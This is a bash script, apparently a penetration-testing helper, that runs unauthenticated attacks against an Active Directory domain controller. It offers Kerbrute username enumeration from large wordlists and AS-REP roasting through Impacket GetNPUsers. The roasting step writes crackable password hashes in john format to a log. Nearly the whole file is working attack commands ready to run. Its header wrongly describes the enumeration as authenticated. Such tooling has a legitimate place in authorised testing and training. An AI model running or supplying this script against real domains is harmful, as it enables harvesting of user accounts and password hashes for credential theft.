#!/usr/bin/env bash
# Author: strikoder
# File: noauth_kerberos
# Usage: ./noauth_kerberos <DC_IP> <DOMAIN>
#
# Purpose:
#   Authenticated SMB/Kerberos enumeration:
#   - Kerbrute user enumeration
#   - AS-REP roasting (Impacket GetNPUsers)
#
# Output:
#   results_noauth_kerberos/<DOMAIN>_<timestamp>/ with .log results
#
# Notes:
#   - Mode 1: Kerbrute userenum (choose wordlist)
#   - Mode 2: AS-REP roasting with a user list
#   - Hints for extracting valid users & fallback GetNPUsers.py included
#

set -euo pipefail

IP="${1:-}"
DOMAIN="${2:-}"

if [[ -z "${IP}" || -z "${DOMAIN}" ]]; then
  echo "Usage: $0 <DC_IP> <DOMAIN>"
  exit 1
fi

log(){ echo -e "\n[*] $*\n"; }
need(){ command -v "$1" >/dev/null || { echo "[-] Missing tool: $1"; exit 1; }; }

echo "Select mode:"
echo "  1) Kerbrute userenum"
echo "  2) AS-REP roasting (GetNPUsers)"
read -rp "Choice [1/2]: " MODE

echo "Select wordlist:"
echo "  1) /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt"
echo "  2) /usr/share/wordlists/john.smith.txt"
echo "  3) Custom path"
read -rp "Choice [1/2/3]: " WLSEL


case "$WLSEL" in
  1) WORDLIST="/usr/share/seclists/Usernames/xato-net-10-million-usernames.txt"; WLNAME="xato 10M" ;;
  2) WORDLIST="/usr/share/wordlists/john.smith.txt"; WLNAME="john.smith" ;;
  3) read -rp "Path to your wordlist (relative or full): " INPUT_PATH
     # Strip to relative if absolute was given
     if [[ "$INPUT_PATH" = /* ]]; then
       WORDLIST="$(realpath --relative-to="$(pwd)" "$INPUT_PATH")"
     else
       WORDLIST="$INPUT_PATH"
     fi
     WLNAME="custom"
     ;;
  *) echo "Invalid wordlist choice"; exit 1 ;;
esac
[[ -f "$WORDLIST" ]] || { echo "Wordlist not found: $WORDLIST"; exit 1; }

# Hints
  echo " "
  echo "#################################HINTS#####################################"
  echo "[hint] awk -F': *' '/VALID USERNAME/{print \$4}' | cut -d ' ' -f 2"
  echo "[hint] If using Kerberos tickets, you might need -k:"
  echo "[hint] if impacket didn't work, try without, and vise versa"
  echo "#################################HINTS#####################################"
  echo " "


OUTDIR="results_noauth_kerberos/"
mkdir -p "$OUTDIR"

if [[ "$MODE" == "1" ]]; then
  need kerbrute
  log "Kerbrute userenum ($WLNAME) → DC=$IP, DOMAIN=$DOMAIN"
  kerbrute userenum -d "$DOMAIN" --dc "$IP" "$WORDLIST" 2>&1 | tee "$OUTDIR/kerbrute_userenum.log"  
  
elif [[ "$MODE" == "2" ]]; then
  need impacket-GetNPUsers
  log "AS-REP roasting (GetNPUsers) ($WLNAME) → DC=$IP, DOMAIN=$DOMAIN"
  impacket-GetNPUsers "$DOMAIN"/ -no-pass -usersfile "$WORDLIST" -dc-ip "$IP" -format john 2>&1 \
    | tee "$OUTDIR/asrep_hashes.log"


else
  echo "Invalid mode"; exit 1
fi

log "Done. Logs in: $OUTDIR"
